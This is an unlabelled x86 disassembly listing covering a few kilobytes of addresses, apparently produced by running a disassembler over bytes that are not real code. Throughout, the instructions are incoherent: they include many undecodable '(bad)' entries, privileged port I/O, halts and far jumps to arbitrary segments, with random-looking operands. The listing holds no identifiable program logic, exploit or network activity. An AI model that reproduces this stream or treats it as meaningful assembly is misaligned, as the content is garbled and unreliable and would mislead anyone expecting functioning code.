  41a6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6c3:	sbb    al,0xbd
  41a6c5:	jmp    0x8ce9:0x41fe3624
  41a6cc:	mov    DWORD PTR [ebx+0x51],0x3e1ca5c3
  41a6d3:	cmp    eax,0x92725928
  41a6d8:	rcr    DWORD PTR [esi],0x99
  41a6db:	imul   edx,DWORD PTR [esi],0x3a
  41a6de:	mov    edx,0x612c0f78
  41a6e3:	ss dec ebx
  41a6e5:	and    al,0x23
  41a6e7:	sbb    esi,DWORD PTR [ecx]
  41a6e9:	push   edx
  41a6ea:	arpl   sp,sp
  41a6ec:	xchg   ecx,eax
  41a6ed:	sbb    dh,bl
  41a6ef:	xlat   BYTE PTR ds:[ebx]
  41a6f0:	cmp    bl,BYTE PTR [ecx+eax*8+0xf874a68]
  41a6f7:	sub    ch,al
  41a6f9:	mov    al,0xb6
  41a6fb:	mov    ch,0x4
  41a6fd:	mov    esp,DWORD PTR [edi+0x5e]
  41a700:	sub    al,0x2a
  41a702:	xlat   BYTE PTR ds:[ebx]
  41a703:	mov    DWORD PTR [edi+edi*8],0xa0928758
  41a70a:	jg     0x41a737
  41a70c:	sub    al,dl
  41a70e:	xor    DWORD PTR [edi+0x23],edi
  41a711:	leave  
  41a712:	mov    WORD PTR [edi],ds
  41a714:	sbb    BYTE PTR [ecx-0x4c05012],0xb5
  41a71b:	mov    dh,0x48
  41a71d:	mov    esi,0x23f782d5
  41a722:	dec    edx
  41a723:	mov    eax,0x4a375d93
  41a728:	fbstp  TBYTE PTR [ebx]
  41a72a:	mov    al,0x63
  41a72c:	jno    0x41a789
  41a72e:	xchg   ecx,eax
  41a72f:	xchg   ebp,eax
  41a730:	pusha  
  41a731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a732:	push   esi
  41a733:	sub    ebx,ecx
  41a735:	dec    ebp
  41a736:	cmc    
  41a737:	je     0x41a741
  41a739:	push   0xffffffcd
  41a73b:	push   esi
  41a73c:	aas    
  41a73d:	xchg   BYTE PTR [ebx],dh
  41a73f:	inc    ecx
  41a740:	(bad)  [ebp+0xf]
  41a743:	sbb    eax,esp
  41a745:	(bad)  
  41a746:	js     0x41a6f2
  41a748:	or     eax,0xeaabad0
  41a74d:	aad    0x92
  41a74f:	push   ebp
  41a750:	std    
  41a751:	sti    
  41a752:	je     0x41a7bb
  41a754:	pop    ds
  41a755:	cmp    eax,0xa105e931
  41a75a:	and    al,0x34
  41a75c:	xor    al,0x35
  41a75e:	inc    ebx
  41a75f:	jecxz  0x41a782
  41a761:	or     edi,ebp
  41a763:	(bad)  
  41a764:	fs sbb edx,ecx
  41a767:	jo     0x41a733
  41a769:	and    bh,BYTE PTR [eax]
  41a76b:	add    al,0xec
  41a76d:	jne    0x41a709
  41a76f:	fsub   st(0),st
  41a771:	push   ds
  41a772:	add    dl,BYTE PTR [ebp+0x3c]
  41a775:	sahf   
  41a776:	ror    al,0xe6
  41a779:	adc    al,BYTE PTR [ecx+0x39a7835a]
  41a77f:	call   0xd31e016b
  41a784:	push   edi
  41a785:	repz pop ds
  41a787:	push   cs
  41a788:	retf   0xe51f
  41a78b:	out    0x67,eax
  41a78d:	xchg   DWORD PTR [esi],esp
  41a78f:	mov    esi,0x32824b4c
  41a794:	xchg   edi,eax
  41a795:	cld    
  41a796:	sub    edx,eax
  41a798:	or     ch,BYTE PTR [esi-0x3b]
  41a79b:	nop
  41a79c:	sub    bh,BYTE PTR [eax-0x9]
  41a79f:	xchg   ebp,eax
  41a7a0:	adc    edx,eax
  41a7a2:	xchg   ebx,eax
  41a7a3:	dec    ebx
  41a7a4:	pop    ss
  41a7a5:	jns    0x41a78f
  41a7a7:	call   0x980eb4ce
  41a7ac:	rcr    BYTE PTR [ebx-0x14018ebb],cl
  41a7b2:	push   0xffffffeb
  41a7b4:	dec    ecx
  41a7b5:	or     al,0x76
  41a7b7:	or     dl,BYTE PTR [edx-0x70b01e0]
  41a7bd:	fidiv  DWORD PTR [esi-0x6e704738]
  41a7c3:	and    DWORD PTR ds:0xae23da6e,edi
  41a7c9:	xor    BYTE PTR [edx],cl
  41a7cb:	ds push esi
  41a7cd:	jno    0x41a7e8
  41a7cf:	data16 cli 
  41a7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7d2:	and    BYTE PTR [edi],0x1b
  41a7d5:	smsw   WORD PTR [eax-0x34]
  41a7d9:	push   edi
  41a7da:	ret    
  41a7db:	jbe    0x41a778
  41a7dd:	test   al,0xf0
  41a7df:	cmp    BYTE PTR [ecx+0x45c1e923],ch
  41a7e5:	std    
  41a7e6:	test   eax,0xe79602ce
  41a7eb:	sbb    BYTE PTR [ebx+ecx*1-0x13ef0603],ah
  41a7f2:	lock pop ebx
  41a7f4:	repnz push esp
  41a7f6:	test   al,0xe1
  41a7f8:	inc    eax
  41a7f9:	loope  0x41a790
  41a7fb:	and    ah,ch
  41a7fd:	xlat   BYTE PTR ds:[ebx]
  41a7fe:	sti    
  41a7ff:	mov    WORD PTR ds:0x7e914113,cs
  41a805:	adc    eax,DWORD PTR [edx+eiz*4]
  41a808:	adc    ch,BYTE PTR [ecx+0x72fc9d9a]
  41a80e:	pusha  
  41a80f:	jp     0x41a827
  41a811:	push   ecx
  41a812:	cld    
  41a813:	arpl   sp,di
  41a815:	ja     0x41a879
  41a817:	pop    eax
  41a818:	lahf   
  41a819:	(bad)  
  41a81a:	fild   QWORD PTR [eax+0x34602fae]
  41a820:	mov    ebp,0x38010ed6
  41a825:	sbb    al,0xae
  41a828:	jo     0x41a87e
  41a82a:	push   ds
  41a82b:	es cmp eax,0x49cd5166
  41a831:	call   0x164c:0x982d601a
  41a838:	sub    al,0x88
  41a83a:	or     BYTE PTR [edx+0x570f8da4],bl
  41a840:	lds    esp,FWORD PTR [edx]
  41a842:	sbb    al,0xd
  41a844:	dec    esi
  41a845:	dec    ecx
  41a846:	or     al,0xaa
  41a848:	add    BYTE PTR [ecx+0x574cfb7b],bh
  41a84e:	jmp    0x49ca75d3
  41a853:	pop    ecx
  41a854:	cwde   
  41a855:	xlat   BYTE PTR ds:[ebx]
  41a856:	inc    ecx
  41a857:	sub    eax,0x1f741cfd
  41a85c:	pop    ss
  41a85d:	mov    ds:0x2f7cd98a,al
  41a862:	int3   
  41a863:	(bad)  
  41a864:	xor    BYTE PTR [ebx],bl
  41a866:	aad    0xd5
  41a868:	mov    dh,BYTE PTR [edi-0x7b]
  41a86b:	js     0x41a8d7
  41a86d:	daa    
  41a86e:	xchg   al,ch
  41a870:	inc    ebx
  41a871:	scas   eax,DWORD PTR es:[edi]
  41a872:	pop    ecx
  41a873:	pop    ecx
  41a874:	fdiv   DWORD PTR [ecx]
  41a876:	adc    al,0xf0
  41a878:	push   es
  41a879:	adc    edi,ebx
  41a87b:	int3   
  41a87c:	xor    eax,DWORD PTR [ebx+0x1c]
  41a87f:	lea    edi,[edi+0x5b]
  41a882:	or     DWORD PTR [esi],edi
  41a884:	scas   eax,DWORD PTR es:[edi]
  41a885:	xor    dl,BYTE PTR [eax]
  41a887:	cmp    DWORD PTR [edx+0x69],ebp
  41a88a:	push   ebp
  41a88b:	test   al,0xcb
  41a88d:	in     eax,dx
  41a88e:	sub    bl,BYTE PTR [edx+0x63]
  41a891:	test   ah,ah
  41a893:	cwde   
  41a894:	jl     0x41a864
  41a896:	xchg   DWORD PTR [esi+0x5a],ebp
  41a899:	es das 
  41a89b:	out    0x7b,eax
  41a89d:	gs loop 0x41a8be
  41a8a0:	or     esi,eax
  41a8a2:	xor    DWORD PTR [esi+0x1a2a2b34],0x62
  41a8a9:	jbe    0x41a866
  41a8ab:	daa    
  41a8ac:	sub    eax,0xce33c6c9
  41a8b1:	mov    ah,0xa6
  41a8b3:	xor    ah,al
  41a8b5:	int3   
  41a8b6:	icebp  
  41a8b7:	into   
  41a8b8:	and    bl,bh
  41a8ba:	shl    BYTE PTR [esp+edi*1-0x73d39d5d],cl
  41a8c1:	inc    esi
  41a8c2:	ds in  al,dx
  41a8c4:	push   ecx
  41a8c5:	sub    ebp,DWORD PTR [edi-0x29]
  41a8c8:	dec    esi
  41a8c9:	sti    
  41a8ca:	lods   eax,DWORD PTR ds:[esi]
  41a8cb:	sbb    eax,0x109b98ad
  41a8d0:	xor    ch,0x53
  41a8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8d4:	mov    dh,0xc7
  41a8d6:	mov    esp,0x88d9f7b3
  41a8db:	test   ebx,edi
  41a8dd:	addr16 jns 0x41a957
  41a8e0:	in     al,0x73
  41a8e2:	retf   
  41a8e3:	mov    WORD PTR [edx+esi*8+0x56],fs
  41a8e7:	rcl    BYTE PTR [ebx-0x6948289a],cl
  41a8ed:	pop    ebx
  41a8ee:	hlt    
  41a8ef:	(bad)  
  41a8f1:	(bad)  
  41a8f2:	ss out dx,eax
  41a8f4:	ror    esp,1
  41a8f6:	fstp   DWORD PTR [ecx-0x68]
  41a8f9:	xor    dh,cl
  41a8fb:	xchg   ecx,esi
  41a8fd:	outs   dx,DWORD PTR ds:[esi]
  41a8fe:	clc    
  41a8ff:	inc    ebp
  41a900:	cwde   
  41a901:	out    0x27,al
  41a903:	aaa    
  41a904:	push   0x235be02a
  41a909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a90a:	and    DWORD PTR [edi+ebx*8-0x5e95e16c],ecx
  41a911:	sub    esp,DWORD PTR fs:[esi-0x3]
  41a915:	pop    esp
  41a916:	jo     0x41a90f
  41a918:	push   cs
  41a919:	std    
  41a91a:	dec    esi
  41a91b:	inc    esp
  41a91c:	cmc    
  41a91d:	clc    
  41a91e:	data16 lahf 
  41a920:	xor    DWORD PTR [ebp-0x3a459992],ebx
  41a926:	lods   al,BYTE PTR fs:[esi]
  41a928:	add    al,0x9
  41a92a:	jle    0x41a8f6
  41a92c:	(bad)  
  41a92d:	dec    esi
  41a92e:	xor    ch,bh
  41a930:	adc    eax,ecx
  41a932:	ret    0xc705
  41a935:	daa    
  41a936:	adc    esp,eax
  41a938:	cmc    
  41a939:	retf   
  41a93a:	add    al,0x55
  41a93c:	mov    al,ds:0x471c395a
  41a941:	lods   eax,DWORD PTR ds:[esi]
  41a942:	or     eax,0x3da1edcf
  41a947:	sar    BYTE PTR [ecx-0x51],0x84
  41a94b:	xor    al,0x72
  41a94d:	outs   dx,BYTE PTR ds:[esi]
  41a94e:	push   ebp
  41a94f:	bswap  ecx
  41a951:	add    al,BYTE PTR [ebx-0x78]
  41a954:	shr    BYTE PTR [edx-0x4f01181],cl
  41a95a:	call   0xc65a7a7
  41a95f:	inc    eax
  41a960:	inc    eax
  41a961:	and    al,0xae
  41a963:	adc    al,0xf8
  41a965:	or     ebx,esp
  41a967:	xchg   edx,eax
  41a968:	push   eax
  41a969:	cmp    ebp,ebx
  41a96b:	or     BYTE PTR [edx-0x58],dl
  41a96e:	fistp  QWORD PTR [ecx]
  41a970:	test   eax,0xc9ab2b9e
  41a975:	push   0xffffffb9
  41a977:	mov    DWORD PTR [ecx+edi*1],edx
  41a97a:	cmp    esp,esp
  41a97c:	and    DWORD PTR [ebp-0x280fb5a6],esi
  41a982:	mov    bl,0xf4
  41a984:	imul   eax,DWORD PTR [eax],0xffffffb9
  41a987:	inc    edi
  41a988:	sub    BYTE PTR [edx+0x3a],0x77
  41a98c:	mov    esp,0xd35e2e82
  41a991:	out    0x2a,al
  41a993:	stc    
  41a994:	bnd jmp 0x187dfd87
  41a99a:	inc    esi
  41a99b:	ss cdq 
  41a99d:	in     al,dx
  41a99e:	fidiv  DWORD PTR [edx-0x18]
  41a9a1:	xlat   BYTE PTR ds:[ebx]
  41a9a2:	jbe    0x41a964
  41a9a4:	les    esi,FWORD PTR [eax-0xf]
  41a9a7:	dec    ebp
  41a9a8:	lods   al,BYTE PTR ds:[esi]
  41a9a9:	dec    esi
  41a9aa:	add    ah,al
  41a9ac:	in     eax,dx
  41a9ad:	add    ebp,edx
  41a9af:	(bad)  
  41a9b0:	(bad)  
  41a9b1:	mov    cl,0x24
  41a9b3:	gs push edi
  41a9b5:	in     eax,dx
  41a9b6:	pop    edx
  41a9b7:	ins    DWORD PTR es:[edi],dx
  41a9b8:	jae    0x41a9dd
  41a9ba:	rcl    bl,cl
  41a9bc:	popf   
  41a9bd:	test   al,0x3e
  41a9bf:	mov    eax,ds:0x7ba22b06
  41a9c4:	out    0xb8,eax
  41a9c6:	xor    DWORD PTR fs:[esi+0x55],ebp
  41a9ca:	je     0x41aa39
  41a9cc:	dec    esi
  41a9cd:	mov    ah,0xe6
  41a9cf:	pop    esp
  41a9d0:	cmp    dh,BYTE PTR [ebx+0x5b3f49a2]
  41a9d6:	mov    dh,0xe3
  41a9d8:	sub    al,0xa5
  41a9da:	(bad)  [edi+edx*1+0x55]
  41a9de:	and    eax,0x2e3a407f
  41a9e3:	data16 shl BYTE PTR [ebp-0x18b87a28],0x69
  41a9eb:	outs   dx,DWORD PTR ds:[esi]
  41a9ec:	shl    edx,cl
  41a9ee:	inc    ebp
  41a9ef:	mov    bh,0x3a
  41a9f1:	loopne 0x41aa08
  41a9f3:	test   BYTE PTR [ebx-0x37],al
  41a9f6:	sub    BYTE PTR [eax],ch
  41a9f8:	cmc    
  41a9f9:	and    DWORD PTR [ecx-0x45],esi
  41a9fc:	pop    esi
  41a9fd:	or     DWORD PTR [edi+0xc5d25f2],eax
  41aa03:	stos   BYTE PTR es:[edi],al
  41aa04:	ins    DWORD PTR es:[edi],dx
  41aa05:	push   ds
  41aa06:	cdq    
  41aa07:	adc    al,0x26
  41aa09:	ja     0x41a9d1
  41aa0b:	mov    ds:0x3207510e,eax
  41aa10:	test   BYTE PTR gs:[edi],0x52
  41aa14:	ror    DWORD PTR [ecx-0x2abbeae0],cl
  41aa1a:	es cmp dl,al
  41aa1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa1e:	shr    BYTE PTR [ecx-0x34],cl
  41aa21:	nop
  41aa22:	neg    BYTE PTR [ecx-0x53]
  41aa25:	mov    dl,0x97
  41aa27:	xchg   edi,eax
  41aa28:	pop    ebp
  41aa29:	cli    
  41aa2a:	sub    esi,edx
  41aa2c:	jno    0x41a9fc
  41aa2e:	sub    DWORD PTR [eax+0x39],ecx
  41aa31:	(bad)
  41aa34:	pop    ebp
  41aa35:	fisub  WORD PTR ds:0x23fd391
  41aa3b:	sbb    ah,dl
  41aa3d:	in     eax,0x61
  41aa3f:	lods   eax,DWORD PTR ds:[esi]
  41aa40:	scas   al,BYTE PTR es:[edi]
  41aa41:	dec    edx
  41aa42:	xchg   edx,eax
  41aa43:	mov    ds:0x387736ff,eax
  41aa48:	bound  ebp,QWORD PTR [edx+ecx*8-0x58]
  41aa4c:	imul   edi,ebx,0x74dc9233
  41aa52:	mov    BYTE PTR [edi+0x6e46a2a1],dh
  41aa58:	or     ch,BYTE PTR [edi]
  41aa5a:	sub    BYTE PTR [eax+0x2271d4bc],ch
  41aa60:	push   esi
  41aa61:	xchg   BYTE PTR [esi+0x52],dh
  41aa64:	sbb    BYTE PTR [eax+0x53],al
  41aa67:	jo     0x41a9f9
  41aa69:	neg    esi
  41aa6b:	sbb    al,0xed
  41aa6d:	push   ds
  41aa6e:	xchg   ebp,eax
  41aa6f:	stos   DWORD PTR es:[edi],eax
  41aa70:	xor    al,0x54
  41aa72:	ret    
  41aa73:	dec    eax
  41aa74:	mov    ah,0xf7
  41aa76:	sahf   
  41aa77:	das    
  41aa78:	jge    0x41aa6e
  41aa7a:	ret    
  41aa7b:	inc    esi
  41aa7c:	sub    BYTE PTR [edi],bh
  41aa7e:	push   edi
  41aa7f:	leave  
  41aa80:	hlt    
  41aa81:	sbb    esi,esp
  41aa83:	jne    0x41aaa4
  41aa85:	and    eax,0xc83eff8d
  41aa8a:	cs inc ebx
  41aa8c:	sbb    BYTE PTR ds:0xa95b64f0,0x33
  41aa93:	outs   dx,DWORD PTR ds:[esi]
  41aa94:	xchg   esi,eax
  41aa95:	pop    edi
  41aa96:	mov    bl,0x43
  41aa98:	(bad)  
  41aa99:	or     ecx,edx
  41aa9b:	(bad)  
  41aa9c:	push   ecx
  41aa9d:	repnz and al,0x89
  41aaa0:	pop    ebx
  41aaa1:	mov    edi,0x5f4053ea
  41aaa6:	ror    BYTE PTR [ebp-0x14],1
  41aaa9:	push   eax
  41aaaa:	(bad)  
  41aaab:	std    
  41aaac:	xchg   ebp,eax
  41aaad:	xchg   edi,eax
  41aaae:	daa    
  41aaaf:	jae    0x41aa46
  41aab1:	cli    
  41aab2:	pop    esi
  41aab3:	enter  0x4711,0x67
  41aab7:	push   edi
  41aab8:	js     0x41aa3e
  41aaba:	dec    ebx
  41aabb:	add    edx,DWORD PTR [eax-0x15ad5ad6]
  41aac1:	(bad)  
  41aac2:	xchg   BYTE PTR [ebp-0x5e784a7d],bh
  41aac8:	rcr    DWORD PTR [ebp-0x7b],0x52
  41aacc:	fcom   DWORD PTR [eax+0x528a8f40]
  41aad2:	popa   
  41aad3:	dec    esp
  41aad4:	xor    eax,0x77016914
  41aad9:	push   ss
  41aada:	or     bh,dh
  41aadc:	pop    edi
  41aadd:	nop
  41aade:	ret    0x1bb3
  41aae1:	inc    ecx
  41aae2:	sub    eax,0x925ff6d7
  41aae7:	pop    ebp
  41aae8:	fwait
  41aae9:	pop    ss
  41aaea:	inc    esi
  41aaeb:	jmp    0x41ab05
  41aaed:	(bad)  
  41aaee:	je     0x41aac6
  41aaf0:	sub    ah,bl
  41aaf2:	outs   dx,BYTE PTR ds:[esi]
  41aaf3:	add    dh,dh
  41aaf5:	clc    
  41aaf6:	aad    0x6c
  41aaf8:	inc    esi
  41aaf9:	mov    ds:0x58abf2c8,al
  41aafe:	push   ss
  41aaff:	aam    0x86
  41ab01:	pop    ss
  41ab02:	pop    ecx
  41ab03:	mov    al,0x48
  41ab05:	sbb    DWORD PTR [ecx-0x1],edi
  41ab08:	mov    ah,0x21
  41ab0a:	and    DWORD PTR [edi-0x6],0x4467c738
  41ab11:	lock mov bh,0x9a
  41ab14:	inc    esi
  41ab15:	xchg   ebx,eax
  41ab16:	add    BYTE PTR [edx-0x41],0xa3
  41ab1a:	xchg   BYTE PTR [ecx-0x3b62300b],cl
  41ab20:	sub    DWORD PTR [eax],edi
  41ab22:	xchg   DWORD PTR [ebp-0x57],esi
  41ab25:	jno    0x41aad1
  41ab27:	in     eax,0x46
  41ab29:	xchg   esi,eax
  41ab2a:	jb     0x41ab63
  41ab2c:	dec    ebp
  41ab2d:	sbb    esp,DWORD PTR [ecx]
  41ab2f:	jmp    0x41aba1
  41ab31:	dec    esp
  41ab32:	popf   
  41ab33:	call   0xe13b:0x2a9a89f9
  41ab3a:	or     BYTE PTR [eax+0x75743d00],cl
  41ab40:	inc    edi
  41ab41:	retf   0xdc55
  41ab44:	sahf   
  41ab45:	sbb    cl,BYTE PTR [eax-0x8]
  41ab48:	xchg   ecx,eax
  41ab49:	shl    BYTE PTR [ecx+0xa],1
  41ab4c:	mov    ecx,0x1ea72bea
  41ab51:	mov    esi,0xa5a09355
  41ab56:	xchg   esp,eax
  41ab57:	lds    eax,FWORD PTR [edx-0x4702df40]
  41ab5d:	mov    BYTE PTR [ecx+edx*4+0x7c2c98b6],bh
  41ab64:	sar    BYTE PTR [ecx+0x70a32ae2],cl
  41ab6a:	push   ebp
  41ab6b:	clc    
  41ab6c:	fnstcw WORD PTR [esi-0x29]
  41ab6f:	jbe    0x41aba8
  41ab71:	(bad)  
  41ab72:	aas    
  41ab73:	mov    ebp,0x6df1f9dc
  41ab78:	xchg   esi,eax
  41ab79:	jae    0x41ab75
  41ab7b:	es adc al,0x8c
  41ab7e:	rcl    DWORD PTR ds:0x36b42bad,0x91
  41ab85:	or     bh,BYTE PTR [eax-0x74eb5221]
  41ab8b:	adc    al,0xf8
  41ab8d:	ret    0xff41
  41ab90:	lods   al,BYTE PTR ds:[esi]
  41ab91:	mov    dl,0xeb
  41ab93:	push   0xffffff9d
  41ab95:	stc    
  41ab96:	jle    0x41ab71
  41ab98:	cmc    
  41ab99:	pop    edi
  41ab9a:	fs out dx,eax
  41ab9c:	and    al,0xe8
  41ab9e:	sub    cl,BYTE PTR [esi-0x14cd9d05]
  41aba4:	jnp    0x41aba5
  41aba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aba7:	pop    ebx
  41aba8:	cld    
  41aba9:	leave  
  41abaa:	(bad)
  41abad:	mov    esi,DWORD PTR [eax-0x4e]
  41abb0:	sbb    DWORD PTR [edi],ebx
  41abb2:	ret    0x4475
  41abb5:	retf   0xc48b
  41abb8:	jo     0x41abc2
  41abba:	int    0xd6
  41abbc:	loopne 0x41ab5b
  41abbe:	mov    ebp,0xd8568aa
  41abc3:	in     al,dx
  41abc4:	mov    ?,WORD PTR [ebx]
  41abc6:	pop    edx
  41abc7:	push   cs
  41abc8:	push   cs
  41abc9:	test   al,0x37
  41abcb:	mov    esi,ss
  41abcd:	mov    esi,0x3cf3267b
  41abd2:	cmc    
  41abd3:	inc    esp
  41abd4:	add    esi,DWORD PTR [ebp+0x6f]
  41abd7:	mov    ah,0x66
  41abd9:	jg     0x41ab80
  41abdb:	ret    
  41abdc:	aaa    
  41abdd:	je     0x41abca
  41abdf:	lock in al,0x27
  41abe2:	cmp    eax,ebp
  41abe4:	add    DWORD PTR [eax],0x66
  41abe7:	sbb    eax,0xc75b3fa3
  41abec:	aad    0xc
  41abee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abef:	sbb    al,0x65
  41abf2:	xor    eax,DWORD PTR [edi-0x5]
  41abf5:	(bad)
  41abf8:	mov    al,0xce
  41abfa:	popa   
  41abfb:	fld    DWORD PTR [ebp+0xdacc0c9]
  41ac01:	mov    al,0x7b
  41ac03:	xor    al,0x7d
  41ac05:	jmp    0x5c486ba7
  41ac0a:	aad    0x9b
  41ac0c:	cmp    al,0xa4
  41ac0e:	outs   dx,DWORD PTR ds:[esi]
  41ac0f:	jge    0x41ab9b
  41ac11:	xlat   BYTE PTR ds:[ebx]
  41ac12:	repz push esi
  41ac14:	fbld   TBYTE PTR [edi+ebp*1-0x2e]
  41ac18:	fst    DWORD PTR [edi-0x5c]
  41ac1b:	adc    eax,0xc1e90933
  41ac20:	aas    
  41ac21:	pop    ebx
  41ac22:	stos   DWORD PTR es:[edi],eax
  41ac23:	cmp    BYTE PTR [ebp+0x1b29606a],ah
  41ac29:	jno    0x41ac5a
  41ac2b:	mov    edi,edx
  41ac2d:	cs jo  0x41ac69
  41ac30:	popa   
  41ac31:	mov    ds:0xe2fc8bcd,eax
  41ac36:	je     0x41ac18
  41ac38:	call   0xf612:0x6bd4e84a
  41ac3f:	sub    DWORD PTR [ebx+0x2b9c320f],eax
  41ac45:	sti    
  41ac46:	mov    eax,ds:0x1277eebb
  41ac4b:	push   cs
  41ac4c:	cmp    al,0xc4
  41ac4e:	xor    esi,esi
  41ac50:	and    DWORD PTR [esi],esi
  41ac52:	cld    
  41ac53:	arpl   sp,dx
  41ac55:	push   ecx
  41ac56:	add    BYTE PTR [edx],0x60
  41ac59:	jp     0x41ac13
  41ac5b:	mov    ss,WORD PTR [ebx-0x74d36772]
  41ac61:	repnz (bad) 
  41ac63:	(bad)  
  41ac64:	mov    esi,0x7efbc4c7
  41ac69:	mov    ds:0xac09672d,eax
  41ac6e:	xor    DWORD PTR [edx-0x67],ecx
  41ac71:	fsubp  st(6),st
  41ac73:	(bad)  [ebx-0x24]
  41ac76:	xor    al,0xac
  41ac78:	mov    cl,0x21
  41ac7a:	mov    dl,0x41
  41ac7c:	adc    edx,eax
  41ac7e:	jb     0x41ac41
  41ac80:	in     al,0xed
  41ac82:	fwait
  41ac83:	pop    esi
  41ac84:	in     eax,0xfb
  41ac86:	ins    BYTE PTR es:[edi],dx
  41ac87:	aam    0x7f
  41ac89:	clc    
  41ac8a:	jl     0x41aca1
  41ac8c:	enter  0x37fe,0xf1
  41ac90:	xor    ecx,ebp
  41ac92:	jmp    0x60db:0x3d0a11a7
  41ac99:	sbb    DWORD PTR [esi],eax
  41ac9b:	cmp    bh,BYTE PTR [eax+edx*2-0x43]
  41ac9f:	repz jmp 0x41ac7e
  41aca2:	jp     0x41ad1b
  41aca4:	xor    BYTE PTR [esi-0x7ed299c1],ch
  41acaa:	loope  0x41aca3
  41acac:	retf   
  41acad:	mov    eax,0x392c1f3f
  41acb2:	mov    ebx,0x3277f2b2
  41acb7:	cli    
  41acb8:	rcl    BYTE PTR [eax+0x263f47f1],cl
  41acbe:	adc    ebx,DWORD PTR [esi-0x58]
  41acc1:	test   dh,cl
  41acc3:	out    dx,al
  41acc4:	scas   eax,DWORD PTR es:[edi]
  41acc5:	and    eax,0x8bb497db
  41acca:	outs   dx,BYTE PTR ds:[esi]
  41accb:	test   DWORD PTR [esi+0x15d48c96],edx
  41acd1:	push   es
  41acd2:	xor    DWORD PTR [edi+0x196201b0],esi
  41acd8:	cdq    
  41acd9:	mov    ch,0x25
  41acdb:	inc    ecx
  41acdc:	xlat   BYTE PTR ds:[ebx]
  41acdd:	pop    es
  41acde:	pop    ebp
  41acdf:	(bad)  
  41ace0:	std    
  41ace1:	or     BYTE PTR [edx-0x5238051],bh
  41ace7:	push   ebp
  41ace8:	push   0x75
  41acea:	test   DWORD PTR [edx-0x169d8003],esp
  41acf0:	xor    eax,0x8e092731
  41acf5:	xchg   ebp,eax
  41acf6:	jg     0x41ad68
  41acf8:	pop    edi
  41acf9:	int3   
  41acfa:	pop    ebx
  41acfb:	add    BYTE PTR [eax+ebp*4-0x38],al
  41acff:	cmp    bh,BYTE PTR [ebx]
  41ad01:	cli    
  41ad02:	mov    ah,0x64
  41ad04:	pop    edx
  41ad05:	add    BYTE PTR [ebx],cl
  41ad07:	and    eax,0x41c334a
  41ad0c:	ins    DWORD PTR es:[edi],dx
  41ad0d:	aaa    
  41ad0e:	(bad)  
  41ad0f:	test   eax,0x90f8aa82
  41ad14:	xchg   esp,eax
  41ad15:	bound  esp,QWORD PTR [ebx+0x2a]
  41ad18:	sub    cl,0x6c
  41ad1b:	lds    eax,FWORD PTR [ebp+0x6e]
  41ad1e:	cdq    
  41ad1f:	ss sbb cl,bl
  41ad22:	fadd   QWORD PTR [ebx+0x7]
  41ad25:	and    BYTE PTR [edi],bl
  41ad27:	jbe    0x41ad4d
  41ad29:	sub    DWORD PTR [edi],ebp
  41ad2b:	stos   DWORD PTR es:[edi],eax
  41ad2c:	and    ah,ch
  41ad2e:	icebp  
  41ad2f:	dec    edx
  41ad30:	inc    esi
  41ad31:	call   0x8a643a2e
  41ad36:	ds push ebp
  41ad38:	es adc al,0x97
  41ad3b:	ror    esi,0x62
  41ad3e:	outs   dx,BYTE PTR ds:[esi]
  41ad3f:	bound  eax,QWORD PTR [edx-0x57]
  41ad42:	imul   BYTE PTR [edi-0x7215e49d]
  41ad48:	jmp    0xafab:0xba56765d
  41ad4f:	js     0x41ad48
  41ad51:	inc    DWORD PTR [ebp-0x9438935]
  41ad57:	das    
  41ad58:	into   
  41ad59:	jp     0x41ada7
  41ad5b:	jo     0x41ad00
  41ad5d:	stc    
  41ad5e:	fcmovu st,st(4)
  41ad60:	ror    DWORD PTR [ebx],1
  41ad62:	jns    0x41ad00
  41ad64:	adc    al,0x15
  41ad66:	(bad)  
  41ad67:	enter  0xcf84,0xca
  41ad6b:	cmp    eax,0x38313925
  41ad70:	or     edi,DWORD PTR [ecx-0x65675a3d]
  41ad76:	xor    edx,ebx
  41ad78:	shl    DWORD PTR [ebx+0x72],0x6c
  41ad7c:	and    eax,0xf95e82f6
  41ad81:	sub    edi,DWORD PTR [edi]
  41ad83:	inc    edi
  41ad84:	mov    ecx,?
  41ad86:	outs   dx,DWORD PTR ds:[esi]
  41ad87:	ja     0x41ad14
  41ad89:	cwde   
  41ad8a:	add    esp,DWORD PTR [esi+esi*1-0x227721da]
  41ad91:	sbb    ecx,esp
  41ad93:	mov    ebp,0x25cf2954
  41ad98:	lock push cs
  41ad9a:	jecxz  0x41ad5b
  41ad9c:	enter  0x655f,0x35
  41ada0:	xor    BYTE PTR [ebx],bh
  41ada2:	lea    ecx,[ebp+ecx*4-0x40]
  41ada6:	data16 sti 
  41ada8:	add    eax,0x1efd8580
  41adad:	adc    BYTE PTR [ecx+ebx*1-0x1a],0x93
  41adb2:	pop    ds
  41adb3:	int3   
  41adb4:	into   
  41adb5:	into   
  41adb6:	(bad)  
  41adb7:	sub    eax,0x153243cb
  41adbc:	dec    ecx
  41adbd:	xor    DWORD PTR [ebx],esp
  41adbf:	push   ss
  41adc0:	adc    BYTE PTR [ebx+0x1a],ch
  41adc3:	ins    BYTE PTR es:[edi],dx
  41adc4:	jo     0x41ada9
  41adc6:	push   0x20
  41adc8:	and    esi,DWORD PTR fs:[esi-0x48]
  41adcc:	push   di
  41adce:	and    DWORD PTR [ebp+0x6fd1300f],ecx
  41add4:	mov    ebp,0x32163c94
  41add9:	adc    al,bh
  41addb:	jle    0x41adef
  41addd:	aad    0xa0
  41addf:	push   esi
  41ade0:	out    0x86,al
  41ade2:	test   eax,0xf607cb11
  41ade7:	and    al,0x31
  41ade9:	push   ebp
  41adea:	xor    al,0xc9
  41adec:	push   ebp
  41aded:	push   es
  41adee:	push   edi
  41adef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf0:	std    
  41adf1:	dec    eax
  41adf2:	imul   eax,DWORD PTR [esp+esi*1],0xadbd42ba
  41adf9:	cmp    cl,BYTE PTR [esi]
  41adfb:	dec    eax
  41adfc:	retf   
  41adfd:	jno    0x41add0
  41adff:	dec    eax
  41ae00:	push   esi
